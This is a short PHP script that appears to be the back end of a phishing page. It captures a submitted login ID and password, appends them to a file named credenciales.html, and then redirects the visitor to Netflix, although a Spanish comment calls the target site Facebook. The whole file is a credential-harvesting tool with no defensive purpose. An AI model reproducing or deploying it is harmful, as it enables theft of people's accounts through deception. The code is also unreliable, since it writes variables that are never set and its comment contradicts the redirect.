<?php

$Correo = $_POST['userLoginId']; 

$Contraseña = $_POST['password'];

$SALTO="\r\n";

$f = fopen("credenciales.html", "a");
fwrite ($f, "----------------------------------".$SALTO.'Correo: '.$userLoginId.$SALTO.'Contraseña: '.$password.$SALTO."----------------------------------".$SALTO);
fclose($f);

sleep(2);

//Redireccione a la web original (Facebook)

header('Location: https://www.netflix.com/');
?>